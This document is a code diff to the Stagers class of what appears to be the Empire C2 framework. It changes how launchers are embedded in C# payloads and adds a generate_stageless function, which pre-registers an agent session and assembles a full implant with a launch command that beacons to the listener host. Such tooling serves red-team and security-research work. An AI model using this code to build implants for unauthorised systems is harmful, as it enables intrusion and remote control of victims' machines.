@@ -18,6 +18,7 @@ import errno
 import logging
 import os
 import shutil
+import string
 import subprocess
 import zipfile
 from builtins import chr, object, str, zip
@@ -163,8 +164,14 @@ class Stagers(object):
         with open(self.mainMenu.installPath + "/stagers/CSharpPS.yaml", "rb") as f:
             stager_yaml = f.read()
         stager_yaml = stager_yaml.decode("UTF-8")
-        posh_code = base64.b64encode(posh_code.encode("UTF-16LE")).decode("UTF-8")
-        stager_yaml = stager_yaml.replace("{{ REPLACE_LAUNCHER }}", posh_code)
+
+        # Write text file to resources to be embedded
+        with open(
+            self.mainMenu.installPath
+            + "/csharp/Covenant/Data/EmbeddedResources/launcher.txt",
+            "w",
+        ) as f:
+            f.write(posh_code)
 
         compiler = self.mainMenu.pluginsv2.get_by_id("csharpserver")
         if not compiler.status == "ON":
@@ -194,15 +201,23 @@ class Stagers(object):
         shellcode = donut.create(file=directory, arch=arch_type)
         return shellcode
 
-    def generate_python_exe(self, posh_code, dot_net_version="net40", obfuscate=False):
+    def generate_python_exe(
+        self, python_code, dot_net_version="net40", obfuscate=False
+    ):
         """
         Generate ironpython launcher embedded in csharp
         """
         with open(self.mainMenu.installPath + "/stagers/CSharpPy.yaml", "rb") as f:
             stager_yaml = f.read()
         stager_yaml = stager_yaml.decode("UTF-8")
-        posh_code = base64.b64encode(posh_code.encode("UTF-8")).decode("UTF-8")
-        stager_yaml = stager_yaml.replace("{{ REPLACE_LAUNCHER }}", posh_code)
+
+        # Write text file to resources to be embedded
+        with open(
+            self.mainMenu.installPath
+            + "/csharp/Covenant/Data/EmbeddedResources/launcher.txt",
+            "w",
+        ) as f:
+            f.write(python_code)
 
         compiler = self.mainMenu.pluginsv2.get_by_id("csharpserver")
         if not compiler.status == "ON":
@@ -664,3 +679,80 @@ $filename = "FILE_UPLOAD_FULL_PATH_GOES_HERE"
         script = script.replace("FILE_UPLOAD_FULL_PATH_GOES_HERE", path)
 
         return script
+
+    def generate_stageless(self, options):
+        listener_name = options["Listener"]["Value"]
+        if options["Language"]["Value"] == "ironpython":
+            language = "python"
+            version = "ironpython"
+        else:
+            language = options["Language"]["Value"]
+            version = ""
+
+        active_listener = self.mainMenu.listenersv2.get_active_listener_by_name(
+            listener_name
+        )
+
+        chars = string.ascii_uppercase + string.digits
+        session_id = helpers.random_string(length=8, charset=chars)
+        staging_key = active_listener.options["StagingKey"]["Value"]
+        delay = active_listener.options["DefaultDelay"]["Value"]
+        jitter = active_listener.options["DefaultJitter"]["Value"]
+        profile = active_listener.options["DefaultProfile"]["Value"]
+        kill_date = active_listener.options["KillDate"]["Value"]
+        working_hours = active_listener.options["WorkingHours"]["Value"]
+        lost_limit = active_listener.options["DefaultLostLimit"]["Value"]
+        if "Host" in active_listener.options:
+            host = active_listener.options["Host"]["Value"]
+        else:
+            host = ""
+
+        # add the agent
+        self.mainMenu.agents.add_agent(
+            session_id,
+            "0.0.0.0",
+            delay,
+            jitter,
+            profile,
+            kill_date,
+            working_hours,
+            lost_limit,
+            listener=listener_name,
+            language=language,
+        )
+
+        with SessionLocal.begin() as db:
+            # update the agent with this new information
+            self.mainMenu.agents.update_agent_sysinfo_db(
+                db,
+                session_id,
+                listener=listener_name,
+                internal_ip="0.0.0.0",
+                username="blank\\blank",
+                hostname="blank",
+                os_details="blank",
+                high_integrity=0,
+                process_name="blank",
+                process_id=99999,
+                language_version=2,
+                language=language,
+                architecture="AMD64",
+            )
+
+        # get the agent's session key
+        session_key = self.mainMenu.agents.get_agent_session_key_db(session_id)
+
+        agent_code = active_listener.generate_agent(
+            active_listener.options, language=language, version=version
+        )
+        comms_code = active_listener.generate_comms(
+            active_listener.options, language=language
+        )
+
+        launch_code = (
+            "\nInvoke-Empire -Servers @('%s') -StagingKey '%s' -SessionKey '%s' -SessionID '%s';"
+            % (host, staging_key, session_key, session_id)
+        )
+
+        full_agent = comms_code + agent_code + launch_code
+        return full_agent
